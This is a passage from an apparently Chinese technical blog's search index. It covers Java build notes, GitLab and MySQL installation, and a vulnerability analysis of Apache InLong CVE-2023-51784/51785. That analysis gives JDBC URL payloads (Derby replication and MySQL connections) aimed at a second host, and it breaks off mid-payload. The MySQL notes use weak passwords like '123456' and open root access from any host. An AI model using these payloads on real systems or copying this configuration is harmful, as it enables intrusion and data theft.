class="hljs-built_in">exec</span> <span class="hljs-built_in">cp</span> &#123;&#125; <span class="hljs-built_in">dir</span> \;find ./ -name <span class="hljs-string">&quot;*.class&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cp</span> &#123;&#125; <span class="hljs-built_in">dir</span> \;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Java/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Java/</url>
    
    <content type="html"><![CDATA[<h1 id="运行java类引入第三方jar包依赖"><a href="#运行java类引入第三方jar包依赖" class="headerlink" title="运行java类引入第三方jar包依赖"></a>运行java类引入第三方jar包依赖</h1><p>场景：</p><p><strong>1、在Linux系统上编写了个java文件，该java文件引入了jdk之外的第三方类，需要怎么编译？</strong></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">javac</span> -cp/-classpath jar_file_path test.java<span class="hljs-attribute">javac</span> -classpath lib/hadoop-common-<span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar test.java<span class="hljs-attribute">javac</span> -cp lib/hadoop-common-<span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.jar test.java</code></pre></div><p><strong>2、在成功编译java文件后，java运行该class文件，提示找不到其他的第三方类，发现第一个第三方jar文件的类还依赖其他类。现已把所需的所有依赖jar包存放在一个路径，如何使用java命令在运行时去搜索指定路径下的jar包里的类？</strong></p><p><strong>使用Extension Classloader来加载</strong></p><div class="code-wrapper"><pre><code class="hljs bash">java -Djava.ext.dirs=<span class="hljs-variable">$JAVA_HOME</span>/jre/lib/ext:jar_file_dir_path <span class="hljs-built_in">test</span>java -Djava.ext.dirs=<span class="hljs-variable">$JAVA_HOME</span>/jre/lib:/root/test/lib <span class="hljs-built_in">test</span></code></pre></div><p><strong>3、Linux上使用javac命令指定多个依赖jar包编译java文件</strong></p><div class="code-wrapper"><pre><code class="hljs bash">javac -<span class="hljs-built_in">cp</span> path/jar1.jar:path/jar2.jar test.java</code></pre></div><h1 id="自定义生成Jre"><a href="#自定义生成Jre" class="headerlink" title="自定义生成Jre"></a>自定义生成Jre</h1><p>从<code>Java9</code>开始Java开始不再提供JRE，需要自己手动生成。<strong>JLink</strong>功能的主要目的是创建我们自己的<strong>定制JRE</strong></p><p><strong>指定模块生成JRE</strong></p><p><code>模块名为jmods目录下的文件前缀</code></p><div class="code-wrapper"><pre><code class="hljs jboss-cli">bin/jlink <span class="hljs-params">--module-path</span> jmods <span class="hljs-params">--add-modules</span> moduleName1[,moduleName2,<span class="hljs-string">...</span>] <span class="hljs-params">--compress=2</span> <span class="hljs-params">--output</span> jre</code></pre></div><p><strong>所有模块生成JRE</strong></p><div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">bin/jlink</span> <span class="hljs-literal">--</span><span class="hljs-comment">module</span><span class="hljs-literal">-</span><span class="hljs-comment">path jmods</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">modules ALL</span><span class="hljs-literal">-</span><span class="hljs-comment">MODULE</span><span class="hljs-literal">-</span><span class="hljs-comment">PATH</span> <span class="hljs-literal">--</span><span class="hljs-comment">compress=2</span> <span class="hljs-literal">--</span><span class="hljs-comment">output jre</span></code></pre></div><p><strong>查看Jar包依赖的JDK内置模块</strong></p><div class="code-wrapper"><pre><code class="hljs fortran">bin\jdeps.exe --<span class="hljs-built_in">print</span>-<span class="hljs-keyword">module</span>-deps --ignore-missing-deps D:\javaProjects\JowtoTool\<span class="hljs-keyword">target</span>\JowtoTool.jar</code></pre></div><h1 id="Windows切换JAVA环境变量不生效"><a href="#Windows切换JAVA环境变量不生效" class="headerlink" title="Windows切换JAVA环境变量不生效"></a>Windows切换JAVA环境变量不生效</h1><p>查看当前java的链接位置</p><div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-keyword">where</span> java</code></pre></div><ul><li>将以下目录内的所有文件删除掉</li></ul><div class="code-wrapper"><pre><code class="hljs livescript">C:<span class="hljs-string">\ProgramData\Oracle\Java\javapath</span>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Common</span> Files<span class="hljs-string">\Oracle\Java\javapath</span>C:<span class="hljs-string">\Program</span> Files (x86)<span class="hljs-string">\Common</span> Files<span class="hljs-string">\Oracle\Java\javapath</span></code></pre></div><ul><li>将环境变量Path中的<code>%JAVA_HOME%/bin</code>移到最前面</li></ul>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitLab搭建</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/GitLab/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/GitLab/</url>
    
    <content type="html"><![CDATA[<p>安装gitlab-yum源</p><div class="code-wrapper"><pre><code class="hljs awk">curl -s https:<span class="hljs-regexp">//</span>packages.gitlab.com<span class="hljs-regexp">/install/</span>repositories<span class="hljs-regexp">/gitlab/gi</span>tlab-ce/script.rpm.sh | sudo bash</code></pre></div><p>安装依赖</p><div class="code-wrapper"><pre><code class="hljs pgsql">yum -y install policycoreutils openssh-<span class="hljs-keyword">server</span> postfixyum install policycoreutils-pythonsystemctl <span class="hljs-keyword">enable</span> sshd &amp;&amp; sudo systemctl <span class="hljs-keyword">start</span> sshdsystemctl <span class="hljs-keyword">enable</span> postfix &amp;&amp; systemctl <span class="hljs-keyword">start</span> postfix</code></pre></div><p>下载RPM安装包</p><div class="code-wrapper"><pre><code class="hljs vim">wget --content-disposition https://packages.gitlab.<span class="hljs-keyword">com</span>/gitlab/gitlab-<span class="hljs-keyword">ce</span>/packages/<span class="hljs-keyword">el</span>/<span class="hljs-number">7</span>/gitlab-<span class="hljs-keyword">ce</span>-<span class="hljs-number">16.2</span>.<span class="hljs-number">7</span>-<span class="hljs-keyword">ce</span>.<span class="hljs-number">0</span>.el7.x86_64.rpm/download.rpm --<span class="hljs-keyword">no</span>-check-certificate</code></pre></div><p>安装</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">yum</span> install -y gitlab-ce-<span class="hljs-number">16</span>.<span class="hljs-number">2</span>.<span class="hljs-number">7</span>-ce.<span class="hljs-number">0</span>.el7.x86_64.rpm</code></pre></div><p>修改配置</p><p>vim &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">external_url</span> <span class="hljs-string">&#x27;http://10.58.120.200&#x27;</span></code></pre></div><p>重新启动</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">gitlab-ctl reconfigure</span><span class="hljs-attribute">gitlab-ctl restart</span></code></pre></div><p>访问</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span><span class="hljs-regexp">/users/</span>sign_in</code></pre></div><p>用户名：root<br>初始密码：查看&#x2F;etc&#x2F;gitlab&#x2F;initial_root_password文件<br>24小时内修改密码：<a href="http://10.58.120.200/-/profile/password/edit">http://10.58.120.200/-/profile/password/edit</a></p><p><a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#101;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#101;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a></p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitLab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/MySQL/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h1><p>安装依赖</p><div class="code-wrapper"><pre><code class="hljs mipsasm">yum -y <span class="hljs-keyword">install </span>ncurses-devel <span class="hljs-keyword">install </span>gcc-* <span class="hljs-keyword">bzip2-* </span><span class="hljs-keyword">bison</span></code></pre></div><p>安装cmake</p><div class="code-wrapper"><pre><code class="hljs vim">tar -xvf cmake-<span class="hljs-number">3.6</span>.<span class="hljs-number">0</span>-rc1.tar.gz<span class="hljs-keyword">cd</span> cmake-<span class="hljs-number">3.6</span>.<span class="hljs-number">0</span>-rc1./configure<span class="hljs-keyword">make</span> &amp;&amp; <span class="hljs-keyword">make</span> install</code></pre></div><p>安装Boost库</p><div class="code-wrapper"><pre><code class="hljs bash">tar -xvf boost_1_59_0.tar.bz2<span class="hljs-built_in">mv</span> ./boost_1_59_0 /usr/local/boost/</code></pre></div><p>安装MySQL</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -xvf mysql-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">24</span>.tar.gz<span class="hljs-attribute">cd</span> mysql-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">24</span></code></pre></div><p>cmake编译</p><div class="code-wrapper"><pre><code class="hljs routeros">cmake . <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql  \<span class="hljs-attribute">DMYSQL_DATADIR</span>=/usr/local/mysql/data/ \<span class="hljs-attribute">DMYSQL_UNIX_ADDR</span>=/usr/local/mysql/mysql.sock \<span class="hljs-attribute">DWITH_INNOBASE_STORAGE_ENGINE</span>=1 \<span class="hljs-attribute">DWITH_MYISAM_STORAGE_ENGINE</span>=1 \<span class="hljs-attribute">DENABLED_LOCAL_INFILE</span>=1 \<span class="hljs-attribute">DEXTRA_CHARSETS</span>=all <span class="hljs-attribute">-DDEFAULT_CHARSET</span>=utf8 <span class="hljs-attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci \<span class="hljs-attribute">DWITH_DEBUG</span>=0 \<span class="hljs-attribute">DWITH_EMBEDDED_SERVER</span>=1 \<span class="hljs-attribute">DDOWNLOAD_BOOST</span>=1 <span class="hljs-attribute">-DENABLE_DOWNLOADS</span>=1 <span class="hljs-attribute">-DWITH_BOOST</span>=/usr/local/boost</code></pre></div><p>编译</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span></code></pre></div><p>安装</p><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span></code></pre></div><p><strong>配置</strong></p><div class="code-wrapper"><pre><code class="hljs awk">cp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>support-files<span class="hljs-regexp">/mysql.server /</span>etc<span class="hljs-regexp">/init.d/my</span>sqlchmod <span class="hljs-number">755</span> <span class="hljs-regexp">/etc/i</span>nit.d/mysqluseradd -s <span class="hljs-regexp">/sbin/</span>nologin -r mysqlchown mysql.mysql  <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span> -Rln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>bin<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/bin/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>lib<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/lib/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>libexec<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/libexec/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>share<span class="hljs-regexp">/man/m</span>an1<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/share/m</span>an/man1ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>share<span class="hljs-regexp">/man/m</span>an8<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/share/m</span>an/man8</code></pre></div><p>vim &#x2F;etc&#x2F;my.cnf</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><span class="hljs-attr">basedir</span>=/usr/local/mysql<span class="hljs-attr">datadir</span>=/usr/local/mysql/data<span class="hljs-attr">socket</span>=/usr/local/mysql/mysql.sock<span class="hljs-attr">symbolic-links</span>=<span class="hljs-number">0</span><span class="hljs-section">[mysqld_safe]</span><span class="hljs-attr">log-error</span>=/var/log/mysql.log<span class="hljs-attr">pid-file</span>=/var/run/mysql.pid</code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>mysql start</code></pre></div><p>初始化</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>bin<span class="hljs-regexp">/mysqld --initialize --user=mysql --basedir=/u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/ --datadir=/u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/data/</span>mysql_secure_installationmysql -u root -p</code></pre></div><h1 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h1><p>下载地址：<a href="https://downloads.mysql.com/archives/community/">https://downloads.mysql.com/archives/community/</a></p><h2 id="8-X版本"><a href="#8-X版本" class="headerlink" title="8.X版本"></a>8.X版本</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><div class="code-wrapper"><pre><code class="hljs axapta">下载安装文件mysql-community-libsmysql-community-libs-compatmysql-community-<span class="hljs-keyword">server</span>mysql-community-<span class="hljs-keyword">client</span>mysql-community-<span class="hljs-keyword">common</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs jboss-cli">卸载旧的mariadbyum -y remove mariadb-libs安装mysqlrpm -ivh <span class="hljs-string">./</span>*<span class="hljs-string">.rpm</span>启动systemctl start mysqld</code></pre></div><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><div class="code-wrapper"><pre><code class="hljs arcade">默认配置目录：/etc/my.cnf.d/<span class="hljs-regexp">/etc/my</span>.cnf默认日志文件：/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/mysqld.<span class="hljs-built_in">log</span>默认数据目录：/<span class="hljs-keyword">var</span>/lib/mysql/</code></pre></div><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>查看默认root密码</strong></p><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/mysqld.<span class="hljs-keyword">log</span>|grep <span class="hljs-string">&quot;temporary password&quot;</span></code></pre></div><p><strong>连接</strong></p><div class="code-wrapper"><pre><code class="hljs css">mysql -u root -<span class="hljs-selector-tag">p</span></code></pre></div><p><strong>修改密码</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql">//查看当前密码复杂度策略<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;validate_password%&#x27;</span>;//修改密码复杂度策略<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password.<span class="hljs-keyword">policy</span>=<span class="hljs-number">0</span>;(<span class="hljs-number">0</span>或LOW代表低级)  密码验证策略低要求<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password.mixed_case_count=<span class="hljs-number">0</span>; 密码至少要包含的小写字母个数和大写字母个数<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password.number_count=<span class="hljs-number">0</span>; 密码至少要包含的数字个数。<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password.special_char_count=<span class="hljs-number">0</span>; 密码至少要包含的特殊字符数<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> validate_password.length=<span class="hljs-number">1</span>; 密码长度限制//设置密码<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;mysql&#x27;</span>;//刷新策略flush <span class="hljs-keyword">privileges</span>;</code></pre></div><p><strong>允许root用户远程访问</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql">use mysql;<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;</code></pre></div><h2 id="5-X版本"><a href="#5-X版本" class="headerlink" title="5.X版本"></a>5.X版本</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><div class="code-wrapper"><pre><code class="hljs axapta">下载安装文件mysql-community-<span class="hljs-keyword">common</span>mysql-community-libsmysql-community-libs-compatmysql-community-<span class="hljs-keyword">client</span>mysql-community-<span class="hljs-keyword">server</span>卸载旧的mariadbyum -y remove mariadb-libs安装rpm -ivh .<span class="hljs-comment">/*.rpm</span><span class="hljs-comment"></span><span class="hljs-comment">启动</span><span class="hljs-comment">systemctl start mysqld</span></code></pre></div><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><div class="code-wrapper"><pre><code class="hljs arcade">默认配置目录/etc/my.cnf.d/<span class="hljs-regexp">/etc/my</span>.cnf默认日志文件/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/mysqld.<span class="hljs-built_in">log</span>默认数据目录/<span class="hljs-keyword">var</span>/lib/mysql/</code></pre></div><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p><strong>查看默认root密码</strong></p><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/mysqld.<span class="hljs-keyword">log</span>|grep <span class="hljs-string">&quot;temporary password&quot;</span></code></pre></div><p><strong>登陆MySQL</strong></p><div class="code-wrapper"><pre><code class="hljs css">mysql -u root -<span class="hljs-selector-tag">p</span></code></pre></div><p><strong>修改密码</strong></p><div class="code-wrapper"><pre><code class="hljs gams"><span class="hljs-comment">//修改数据库密码复杂度策略</span><span class="hljs-keyword">set</span> global <span class="hljs-comment">validate_password_policy=0</span>;<span class="hljs-keyword">set</span> global <span class="hljs-comment">validate_password_length=1</span>;<span class="hljs-comment">//设置密码</span><span class="hljs-keyword">set</span> password <span class="hljs-comment">for root@localhost=password(</span><span class="hljs-comment">&#x27;123456&#x27;</span><span class="hljs-comment">)</span>;<span class="hljs-comment">//刷新配置</span>flush privileges;</code></pre></div><p><strong>允许root用户远程访问</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> root@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span>;flush <span class="hljs-keyword">privileges</span>;</code></pre></div><p>创建数据库</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> testdb <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_general_ci;</code></pre></div><h1 id="二进制安装"><a href="#二进制安装" class="headerlink" title="二进制安装"></a>二进制安装</h1><p>下载地址：<a href="https://downloads.mysql.com/archives/community/">https://downloads.mysql.com/archives/community/</a></p><p>参考：<a href="https://dev.mysql.com/doc/refman/8.4/en/binary-installation.html">https://dev.mysql.com/doc/refman/8.4/en/binary-installation.html</a></p><p><strong>安装依赖</strong></p><div class="code-wrapper"><pre><code class="hljs q">yum install -y libaioapt <span class="hljs-keyword">update</span>apt-<span class="hljs-built_in">get</span> install libaio-<span class="hljs-built_in">dev</span> libaio1</code></pre></div><p><strong>安装</strong></p><div class="code-wrapper"><pre><code class="hljs bash">tar -xf mysql-8.0.31-linux-glibc2.17-aarch64.tar.gz -C /usr/local/<span class="hljs-built_in">cd</span> /usr/local<span class="hljs-built_in">mv</span> mysql-8.0.31-linux-glibc2.17-aarch64 mysql<span class="hljs-built_in">mkdir</span> -p mysql-files conf logs tmp<span class="hljs-built_in">chown</span> -R mysql:mysql /usr/local/mysql/logs /usr/local/mysql/tmpgroupadd mysqluseradd -r -g mysql -s /bin/false mysql<span class="hljs-built_in">chown</span> mysql:mysql mysql-files<span class="hljs-built_in">chmod</span> 750 mysql-files初始化mysqld --initialize --user=mysql</code></pre></div><p><strong>配置环境变量</strong></p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=/usr/local/mysql/bin:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; /etc/profile<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export MYSQL_UNIX_PORT=/usr/local/mysql/tmp/mysqld.sock&quot;</span> &gt;&gt; /etc/profile<span class="hljs-built_in">source</span> /etc/profile</code></pre></div><p><strong>配置文件</strong></p><p>&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;conf&#x2F;my.cnf</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><span class="hljs-attr">basedir</span>= /usr/local/mysql<span class="hljs-attr">datadir</span>= /usr/local/mysql/data<span class="hljs-attr">socket</span>= /usr/local/mysql/tmp/mysqld.sock<span class="hljs-attr">mysqlx_socket</span> = /usr/local/mysql/tmp/mysqlx.sock<span class="hljs-attr">symbolic-links</span>= <span class="hljs-number">0</span><span class="hljs-attr">bind-address</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-attr">port</span> = <span class="hljs-number">3306</span><span class="hljs-attr">user</span> = mysql<span class="hljs-attr">log-error</span>= /usr/local/mysql/logs/mysqld.log<span class="hljs-attr">pid-file</span>= /usr/local/mysql/tmp/mysqld.pid<span class="hljs-attr">tmpdir</span> = /usr/local/mysql/tmp<span class="hljs-section">[client]</span><span class="hljs-attr">socket</span> = /usr/local/mysql/tmp/mysqld.sock</code></pre></div><p><strong>启动</strong></p><div class="code-wrapper"><pre><code class="hljs gradle">mysqld --defaults-<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>conf/my.cnf</code></pre></div><p><strong>关闭</strong></p><div class="code-wrapper"><pre><code class="hljs arduino">mysqladmin -u root -p shutdown</code></pre></div><p><strong>注册到系统服务</strong></p><p>vi &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;mysqld.service</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><span class="hljs-attr">Description</span>=MySQL Server<span class="hljs-attr">After</span>=network.target<span class="hljs-section">[Service]</span><span class="hljs-attr">User</span>=mysql<span class="hljs-attr">Group</span>=mysql<span class="hljs-attr">ExecStart</span>=/usr/local/mysql/bin/mysqld --defaults-file=/usr/local/mysql/conf/my.cnf<span class="hljs-attr">ExecStop</span>=/usr/local/mysql/bin/mysqladmin shutdown<span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<span class="hljs-attr">RestartSec</span>=<span class="hljs-number">5</span>s<span class="hljs-section">[Install]</span><span class="hljs-attr">WantedBy</span>=multi-user.target</code></pre></div><p><strong>操作</strong></p><div class="code-wrapper"><pre><code class="hljs bash">systemctl daemon-reloadsystemctl start mysqldsystemctl stop mysqld</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache-InLong-CVE-2023-51784</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-InLong-CVE-2023-51784/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-InLong-CVE-2023-51784/</url>
    
    <content type="html"><![CDATA[<p>漏洞通告：<a href="https://lists.apache.org/thread/4nxbyl6mh5jgh0plk0qposbxwn6w9h8j">https://lists.apache.org/thread/4nxbyl6mh5jgh0plk0qposbxwn6w9h8j</a></p><p>影响版本：1.5.0 &lt;&#x3D; Apache InLong &lt;&#x3D; 1.9.0</p><p><a href="https://github.com/apache/inlong/issues/9328">https://github.com/apache/inlong/issues/9328</a></p><p>修复代码：<a href="https://github.com/apache/inlong/commit/1edaf8bb1113cfb90cd451a0830caa15d9ff08b9">https://github.com/apache/inlong/commit/1edaf8bb1113cfb90cd451a0830caa15d9ff08b9</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://inlong.apache.org/zh-CN/docs/deployment/docker">https://inlong.apache.org/zh-CN/docs/deployment/docker</a></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TEST&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CLICKHOUSE&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:derby:jFTAp;create=true&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;offlineUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;enableAuth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TEST&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CLICKHOUSE&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:derby:jFTAp;startMaster=true;slaveHost=10.58.120.201;slavePort=8000;&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;offlineUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;enableAuth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>CVE-2023-51785</p><p><a href="https://lists.apache.org/thread/g0yjmtjqvp8bnf1j0tdsk0nhfozjdjno">https://lists.apache.org/thread/g0yjmtjqvp8bnf1j0tdsk0nhfozjdjno</a></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;STARROCKS&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:mysql://10.58.120.201:8000/test&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span 